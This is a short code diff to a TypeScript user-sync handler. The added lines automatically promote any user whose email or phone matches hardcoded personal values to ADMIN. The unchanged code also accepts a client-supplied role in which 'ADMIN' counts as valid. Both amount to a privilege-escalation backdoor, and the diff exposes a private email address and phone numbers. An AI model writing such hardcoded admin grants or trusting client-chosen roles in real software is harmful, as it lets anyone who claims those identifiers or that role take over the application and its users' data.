@@ -16,7 +16,14 @@ export const syncUser = async (req: AuthRequest, res: Response) => {
 
     // Validate role
     const validRoles = ['CUSTOMER', 'VENDOR', 'DRIVER', 'ADMIN'];
-    const userRole = validRoles.includes(role) ? role : 'CUSTOMER';
+    let userRole = validRoles.includes(role) ? role : 'CUSTOMER';
+
+    // Auto-promote specific user to ADMIN
+    const adminEmail = 'amytzee@gmail.com';
+    const adminPhone = '255687225353';
+    if (email === adminEmail || phone === adminPhone || phone === '0687225353') {
+      userRole = 'ADMIN';
+    }
 
     const user = await prisma.user.upsert({
       where: { firebaseUid },
